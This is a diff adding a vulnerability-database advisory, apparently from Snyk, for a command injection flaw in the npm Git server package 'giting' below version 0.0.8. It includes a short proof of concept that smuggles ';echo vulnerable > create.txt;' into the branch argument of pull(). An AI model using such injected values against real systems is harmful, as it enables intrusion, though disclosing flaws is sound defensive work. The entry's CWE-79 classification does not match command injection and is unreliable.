@@ -1,0 +1,38 @@
+---
+- id: snykio:npm:giting:559008
+  title: Command Injection
+  description: |
+    [giting][1] is a Git server.
+
+    Affected versions of this package are vulnerable to Command Injection.
+    The first argument \"repo\" of function `pull()` is executed by the
+    package without any validation.
+
+    ### PoC by JHU System Security Lab   {#poc-by-jhu-system-security-lab}
+
+        var Test = require("giting");
+        var injection_command = ";echo vulnerable > create.txt;";
+        test = new Test({"workDir": "./"});
+        repo = {"organization": "./", "name": "./", "branch": injection_command}
+        test.pull(repo, function(){});
+
+
+
+    [1]: https://www.npmjs.com/package/giting
+  affected_package: giting
+  vulnerable_versions:
+  - "<0.0.8"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2019-10802
+  cwe:
+  - CWE-79
+  disclosed_date: 2020-02-28
+  created_date: 2020-02-28
+  last_modified_date: 2020-02-28
+  credit:
+  - JHU System Security Lab
+  references:
+  - https://github.com/MangoRaft/git/commit/9be41081f547d3dcef25e7d7c957bc2a3be2dfe0
+  source_url: https://snyk.io/vuln/SNYK-JS-GITING-559008
